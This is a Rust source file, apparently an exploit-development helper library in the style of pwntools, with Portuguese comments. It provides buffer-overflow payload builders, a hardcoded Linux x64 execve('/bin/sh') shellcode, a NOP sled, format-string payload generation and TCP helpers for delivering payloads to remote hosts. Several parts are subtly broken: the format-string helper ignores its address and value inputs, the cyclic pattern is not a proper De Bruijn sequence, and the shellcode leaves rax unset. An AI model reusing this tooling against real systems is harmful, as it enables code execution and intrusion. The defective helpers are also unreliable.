use std::io::{self, Write};
use std::net::{TcpStream, ToSocketAddrs};

pub struct PwnTools;

impl PwnTools {
    /// Gerar padrão cíclico (útil para encontrar offset de buffer overflow)
    pub fn cyclic_pattern(length: usize) -> Vec<u8> {
        let charset = b"abcdefghijklmnopqrstuvwxyz";
        let mut pattern = Vec::new();

        let mut i = 0;
        let mut j = 0;
        let mut k = 0;

        while pattern.len() < length {
            pattern.push(charset[i]);
            pattern.push(charset[j]);
            pattern.push(charset[k]);
            pattern.push(charset[0]); // Separador

            k += 1;
            if k >= charset.len() {
                k = 0;
                j += 1;
                if j >= charset.len() {
                    j = 0;
                    i += 1;
                }
            }
        }

        pattern.truncate(length);
        pattern
    }

    /// Encontrar offset em padrão cíclico
    pub fn cyclic_find(pattern: &[u8], target: &[u8]) -> Option<usize> {
        for i in 0..pattern.len().saturating_sub(target.len()) {
            if &pattern[i..i + target.len()] == target {
                return Some(i);
            }
        }
        None
    }

    /// Converter endereço para bytes (little-endian)
    pub fn p64(value: u64) -> Vec<u8> {
        value.to_le_bytes().to_vec()
    }

    /// Converter endereço para bytes (little-endian) - 32 bits
    pub fn p32(value: u32) -> Vec<u8> {
        value.to_le_bytes().to_vec()
    }

    /// Converter bytes para u64 (little-endian)
    pub fn u64(bytes: &[u8]) -> u64 {
        let mut array = [0u8; 8];
        array.copy_from_slice(&bytes[..8]);
        u64::from_le_bytes(array)
    }

    /// Converter bytes para u32 (little-endian)
    pub fn u32(bytes: &[u8]) -> u32 {
        let mut array = [0u8; 4];
        array.copy_from_slice(&bytes[..4]);
        u32::from_le_bytes(array)
    }

    /// Criar payload de buffer overflow simples
    pub fn create_bof_payload(
        padding: usize,
        return_address: u64,
        shellcode: Option<&[u8]>,
    ) -> Vec<u8> {
        let mut payload = vec![b'A'; padding];
        payload.extend_from_slice(&Self::p64(return_address));

        if let Some(sc) = shellcode {
            payload.extend_from_slice(sc);
        }

        payload
    }

    /// Shellcode Linux x64 execve("/bin/sh")
    pub fn linux_x64_shell() -> Vec<u8> {
        vec![
            0x48, 0x31, 0xd2,                     // xor rdx, rdx
            0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69,   // mov rbx, '/bin/sh'
            0x6e, 0x2f, 0x73, 0x68,
            0x48, 0xc1, 0xeb, 0x08,               // shr rbx, 8
            0x53,                                  // push rbx
            0x48, 0x89, 0xe7,                     // mov rdi, rsp
            0x50,                                  // push rax
            0x57,                                  // push rdi
            0x48, 0x89, 0xe6,                     // mov rsi, rsp
            0xb0, 0x3b,                           // mov al, 0x3b (execve)
            0x0f, 0x05,                           // syscall
        ]
    }

    /// NOP sled
    pub fn nop_sled(length: usize) -> Vec<u8> {
        vec![0x90; length]
    }

    /// Conectar a um host remoto (para exploits remotos)
    pub fn connect(host: &str, port: u16) -> io::Result<TcpStream> {
        let addr = format!("{}:{}", host, port);
        TcpStream::connect(addr)
    }

    /// Enviar payload
    pub fn send_payload(stream: &mut TcpStream, payload: &[u8]) -> io::Result<()> {
        stream.write_all(payload)?;
        stream.flush()?;
        Ok(())
    }

    /// Receber dados
    pub fn recv(stream: &mut TcpStream, size: usize) -> io::Result<Vec<u8>> {
        use std::io::Read;
        let mut buffer = vec![0u8; size];
        stream.read_exact(&mut buffer)?;
        Ok(buffer)
    }

    /// Formato strings - gerar payload
    pub fn format_string_payload(offset: usize, address: u64, value: u32) -> String {
        // Payload básico de format string
        format!("%{}$n", offset)
    }

    /// Calcular alinhamento
    pub fn align(value: usize, alignment: usize) -> usize {
        (value + alignment - 1) & !(alignment - 1)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_p64_u64() {
        let addr = 0xdeadbeef;
        let bytes = PwnTools::p64(addr);
        assert_eq!(PwnTools::u64(&bytes), addr);
    }

    #[test]
    fn test_cyclic_pattern() {
        let pattern = PwnTools::cyclic_pattern(100);
        assert_eq!(pattern.len(), 100);
    }
}
